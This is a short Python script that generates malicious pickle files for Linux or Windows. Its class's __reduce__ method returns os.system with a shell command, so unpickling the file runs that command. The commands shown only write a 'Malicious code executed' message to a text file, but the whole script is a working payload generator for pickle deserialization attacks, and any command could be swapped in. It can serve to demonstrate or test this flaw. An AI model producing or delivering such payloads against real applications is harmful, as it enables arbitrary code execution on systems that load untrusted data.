import pickle
import os
import sys

class EvilPickle:
    def __init__(self, payload_type="linux"):
        self.payload_type = payload_type
    
    def __reduce__(self):
        if self.payload_type == "linux":
            cmd = "echo 'Malicious code executed on Linux!' > /tmp/evil.txt"
        elif self.payload_type == "windows":
            cmd = "echo Malicious code executed on Windows! > C:\\Users\\Public\\evil.txt"
        else:
            cmd = "echo 'Unknown OS payload executed!' > /tmp/evil.txt"
        
        return (os.system, (cmd,))
    
def generate_pickle(filename, payload_type="linux"):
    with open(filename, 'wb') as f:
        pickle.dump(EvilPickle(payload_type), f)
    print(f"Payload generated: {filename}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python evil-pickle.py <payload_type> <output_file>")
        print("payload_type: linux | windows")
        sys.exit(1)
    else:
        payload_type = sys.argv[1]
        output_file = sys.argv[2]
        generate_pickle(output_file, payload_type)